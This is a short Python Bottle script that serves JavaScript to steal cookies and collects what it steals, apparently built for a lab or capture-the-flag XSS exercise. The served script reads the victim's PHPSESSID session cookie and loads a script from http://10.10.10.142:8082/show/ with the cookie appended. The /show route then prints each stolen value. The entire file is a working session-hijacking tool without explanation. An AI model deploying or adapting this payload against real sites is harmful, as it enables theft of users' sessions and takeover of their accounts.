from bottle import route, run, template


@route('/')
def index():
    return "function readCookie(name) {" \
            "            var nameEQ = name + \"=\";"\
            "            var ca = document.cookie.split(';');"\
            "            for (var i = 0; i < ca.length; i++) {"\
            "                var c = ca[i];"\
            "                while (c.charAt(0) == ' ') c = c.substring(1, c.length);"\
            "                if (c.indexOf(nameEQ) == 0) return c.substring(nameEQ.length, c.length);"\
            "            }"\
            "            return null;"\
            "        };var cookieId = readCookie('PHPSESSID'); "\
            "$('body').append($('<script />', {src:'http://10.10.10.142:8082/show/' + cookieId}))"

@route('/show/<cookie_val>')
def show(cookie_val):
    print(cookie_val)

run(host='10.10.10.142', port=8082)
